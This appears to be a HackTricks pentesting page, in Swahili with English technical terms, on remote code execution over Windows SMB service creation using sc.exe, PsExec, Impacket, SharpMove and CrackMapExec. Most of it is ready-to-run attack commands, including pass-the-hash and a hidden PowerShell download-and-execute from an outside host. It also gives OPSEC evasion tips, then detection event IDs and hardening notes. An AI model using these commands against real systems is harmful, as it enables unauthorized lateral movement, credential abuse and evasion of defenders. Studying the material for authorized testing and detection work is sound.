# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Zinafanyaje kazi

Mbinu hizi hutumia vibaya Windows Service Control Manager (SCM) kwa mbali kupitia SMB/RPC ili kutekeleza commands kwenye host lengwa. Mtiririko wa kawaida ni:

1. Authenticate kwenye target na ufikie share ya ADMIN$ kupitia SMB (TCP/445).
2. Copy executable au bainisha command line ya LOLBAS ambayo service itatekeleza.
3. Create service kwa mbali kupitia SCM (MS-SCMR over \PIPE\svcctl) inayoelekeza kwenye command au binary hiyo.
4. Start service ili kutekeleza payload na, kwa hiari, capture stdin/stdout kupitia named pipe.
5. Stop service na ufanye cleanup (delete service na binaries zozote zilizodondoshwa).

Mahitaji/prereqs:
- Local Administrator kwenye target (SeCreateServicePrivilege) au service creation rights zilizoainishwa wazi kwenye target.
- SMB (445) inafikika na share ya ADMIN$ inapatikana; Remote Service Management inaruhusiwa kupitia host firewall.
- UAC Remote Restrictions: ukiwa na local accounts, token filtering inaweza kuzuia admin kupitia network isipokuwa utumie built-in Administrator au LocalAccountTokenFilterPolicy=1.
- Kerberos dhidi ya NTLM: kutumia hostname/FQDN huwezesha Kerberos; kuunganisha kwa IP mara nyingi hurudi kwenye NTLM (na kunaweza kuzuiwa kwenye mazingira yenye hardening).

### Manual ScExec/WinExec kupitia sc.exe

Ifuatayo inaonyesha mbinu ndogo ya service-creation. Service image inaweza kuwa EXE iliyodondoshwa au LOLBAS kama cmd.exe au powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Maelezo:
- Tarajia hitilafu ya timeout unapoanzisha EXE isiyo ya service; execution bado hufanyika.
- Ili kubaki na OPSEC-friendly zaidi, pendelea commands zisizo na faili (cmd /c, powershell -enc) au futa artifacts zilizodondoshwa.

Pata hatua za kina zaidi katika: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Zana na mifano

### Sysinternals PsExec.exe

- Admin tool ya kawaida inayotumia SMB kudondosha PSEXESVC.exe katika ADMIN$, kusakinisha service ya muda (jina la default PSEXESVC), na ku-proxy I/O kupitia named pipes.
- Mifano ya matumizi:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Unaweza kuendesha moja kwa moja kutoka Sysinternals Live kupitia WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Huacha matukio ya usakinishaji/uondoaji wa service (jina la service mara nyingi huwa PSEXESVC isipokuwa -r itumike) na huunda C:\Windows\PSEXESVC.exe wakati wa utekelezaji.

### Impacket psexec.py (PsExec-like)

- Hutumia service inayofanana na RemCom iliyopachikwa. Huacha binary ya service ya muda (mara nyingi ikiwa na jina lililobadilishwa kwa nasibu) kupitia ADMIN$, huunda service (kwa kawaida huwa RemComSvc), na hupitisha I/O kupitia named pipe.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- EXE ya muda katika C:\Windows\ (herufi 8 za random). Jina la service kwa chaguo-msingi ni RemComSvc isipokuwa libadilishwe.

### Impacket smbexec.py (SMBExec)

- Huunda service ya muda inayozindua cmd.exe na kutumia named pipe kwa I/O. Kwa kawaida huepuka kuacha EXE payload kamili; command execution huwa semi-interactive.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) inatekeleza mbinu kadhaa za lateral movement, ikiwemo service-based exec.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) inajumuisha urekebishaji/uundaji wa service ili kutekeleza command kwa mbali.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Unaweza pia kutumia CrackMapExec kutekeleza kupitia backends tofauti (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, detection and artifacts

Artifakti za kawaida za host/network unapotumia mbinu zinazofanana na PsExec:
- Security 4624 (Logon Type 3) na 4672 (Special Privileges) kwenye target kwa akaunti ya admin iliyotumika.
- Security 5140/5145 File Share na File Share Detailed events zinazoonyesha ufikiaji wa ADMIN$ na create/write ya service binaries (kwa mfano, PSEXESVC.exe au random 8-char .exe).
- Security 7045 Service Install kwenye target: majina ya services kama PSEXESVC, RemComSvc, au custom (-r / -service-name).
- Sysmon 1 (Process Create) kwa services.exe au service image, 3 (Network Connect), 11 (File Create) ndani ya C:\Windows\, 17/18 (Pipe Created/Connected) kwa pipes kama \\.\pipe\psexesvc, \\.\pipe\remcom_*, au equivalents zilizorandomishwa.
- Registry artifact ya Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 kwenye operator host (ikiwa haikuzuiwa).

Hunting ideas
- Weka alert kwenye service installs ambapo ImagePath inajumuisha cmd.exe /c, powershell.exe, au TEMP locations.
- Tafuta process creations ambapo ParentImage ni C:\Windows\PSEXESVC.exe au children wa services.exe wanaoendesha kama LOCAL SYSTEM na kutekeleza shells.
- Weka alama kwenye named pipes zinazoishia na -stdin/-stdout/-stderr au majina ya pipes yanayojulikana ya PsExec clones.

## Troubleshooting common failures
- Access is denied (5) wakati wa kuunda services: si local admin halisi, UAC remote restrictions kwa local accounts, au EDR tampering protection kwenye service binary path.
- The network path was not found (53) au haikuweza kuunganisha kwa ADMIN$: firewall inazuia SMB/RPC au admin shares zimezimwa.
- Kerberos inashindwa lakini NTLM imezuiwa: unganisha ukitumia hostname/FQDN (si IP), hakikisha SPNs ziko sahihi, au toa -k/-no-pass pamoja na tickets unapotumia Impacket.
- Service start times out lakini payload iliendeshwa: hii inatarajiwa ikiwa si real service binary; capture output kwenye file au tumia smbexec kwa live I/O.

## Hardening notes
- Windows 11 24H2 na Windows Server 2025 zinahitaji SMB signing kwa default kwa outbound (na Windows 11 inbound) connections. Hii haivunji matumizi halali ya PsExec yenye valid creds lakini inazuia unsigned SMB relay abuse na inaweza kuathiri devices ambazo hazitumii signing.<sup>[[2]](#references)</sup>
- New SMB client NTLM blocking (Windows 11 24H2/Server 2025) inaweza kuzuia NTLM fallback wakati wa kuunganisha kwa IP au kwenye non-Kerberos servers. Katika mazingira yaliyofanywa hardening, hii itavunja PsExec/SMBExec inayotegemea NTLM; tumia Kerberos (hostname/FQDN) au configure exceptions ikiwa inahitajika kihalali.<sup>[[2]](#references)</sup>
- Principle of least privilege: punguza local admin membership, pendelea Just-in-Time/Just-Enough Admin, enforce LAPS, na monitor/alert kwenye 7045 service installs.

## See also

- WMI-based remote exec (mara nyingi huwa fileless zaidi):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-based remote exec:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
